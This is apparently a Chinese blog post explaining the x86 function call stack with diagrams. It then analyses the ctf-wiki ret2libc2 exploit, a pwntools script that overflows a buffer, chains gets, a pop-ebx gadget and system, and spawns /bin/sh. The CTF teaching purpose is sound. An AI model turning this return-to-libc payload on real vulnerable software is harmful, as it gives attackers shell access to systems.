---
title: 'x86 调用栈总结'
date: '2022-10-04'
tags:
    - x86
    - reverse engineering
    - calling convention
---

本文对 x86 的调用栈进行简单总结并对 ctf-wiki 中对 ret2libc2 的 payload 进行分析。

## 函数调用栈

在发生函数调用时，函数运行时的状态会被保存在栈中。

```text
          High address
    +---------------------+
    |                     |
    |    Caller's State   |
    |                     |
    +---------------------+
    |                     |
    |    Callee's State   |
    |                     |
    +---------------------+ <---- esp
          Low address
```

在发生函数调用时，首先将被调用函数（callee）的参数逆序压入

```text
               High address
    +-------------------------------+
    |         Return Address        |
    +-------------------------------+
    |     Caller's Caller's EBP     |
    +-------------------------------+
    |              ...              |
    +-------------------------------+ <---- EBP
    |           Argument #n         |
    +-------------------------------+
    |              ...              |
    +-------------------------------+
    |           Argument #2         |
    +-------------------------------+
    |           Argument #1         |
    +-------------------------------+ <---- ESP
                Low address
```

之后将调用后的下一条指令的地址作为返回地址压入

```text
               High address
    +-------------------------------+
    |         Return Address        |
    +-------------------------------+
    |     Caller's Caller's EBP     |
    +-------------------------------+
    |              ...              |
    +-------------------------------+ <---- EBP
    |           Argument #n         |
    +-------------------------------+
    |              ...              |
    +-------------------------------+
    |           Argument #2         |
    +-------------------------------+
    |           Argument #1         |
    +-------------------------------+
    |         Return Address        |
    +-------------------------------+ <---- ESP
                Low address
```

之后将当前的 EBP 值（即 Caller 的基地址）压入，再将 EBP 更新为目前的栈顶

```text
               High address
    +-------------------------------+
    |         Return Address        |
    +-------------------------------+
    |     Caller's Caller's EBP     |
    +-------------------------------+
    |              ...              |
    +-------------------------------+
    |           Argument #n         |
    +-------------------------------+
    |              ...              |
    +-------------------------------+
    |           Argument #2         |
    +-------------------------------+
    |           Argument #1         |
    +-------------------------------+
    |         Return Address        |
    +-------------------------------+
    |          Caller's EBP         |
    +-------------------------------+ <---- ESP, EBP
                Low address
```

最后被调用函数的局部变量也会被压入

```text
               High address
    +-------------------------------+
    |         Return Address        |
    +-------------------------------+
    |     Caller's Caller's EBP     |
    +-------------------------------+
    |              ...              |
    +-------------------------------+
    |           Argument #n         |
    +-------------------------------+
    |              ...              |
    +-------------------------------+
    |           Argument #2         |
    +-------------------------------+
    |           Argument #1         |
    +-------------------------------+
    |         Return Address        |
    +-------------------------------+
    |          Caller's EBP         |
    +-------------------------------+ <---- EBP
    |         Local Variables       |
    +-------------------------------+ <---- ESP
                Low address
```

在调用结束返回时会首先将局部变量弹出，再从栈中恢复 EBP，再将栈中的返回地址恢复到 EIP。

## 对 ret2libc2 的分析

此处对 ctf-wiki 中 ret2libc2 的 exp 的 payload 进行分析

```python
##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(
    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

在溢出覆盖返回地址之后栈的布局：

```text
               High address
    +-------------------------------+
    |              buf2             | <---- Argument
    +-------------------------------+
    |           0xdeadbeef          | <---- Placeholder for return address
    +-------------------------------+
    |           system_plt          | <---- for `ret`
    +-------------------------------+ 
    |              buf2             | <---- Argument
    +-------------------------------+
    |            pop_ebx            | <---- Return Address
    +-------------------------------+
    |            gets_plt           | <---- Return Address
    +-------------------------------+
    |              'a'              | <---- Saved EBP of main (overwritten)
    +-------------------------------+
    |              'a'              |
    +-------------------------------+
    |              ...              |
    +-------------------------------+
    |              'a'              |
    +-------------------------------+ <---- Address of s
                Low address
```

其中跳转到 `gets` 之后会将 EBP 入栈，在调用结束之后出栈，所以只需将 `pop_ebx` 作为返回地址压入即可。而在 `pop ebx ; ret` 执行完毕之后会将 `buf2` 出栈，并通过 `ret` 跳转到 `system`。
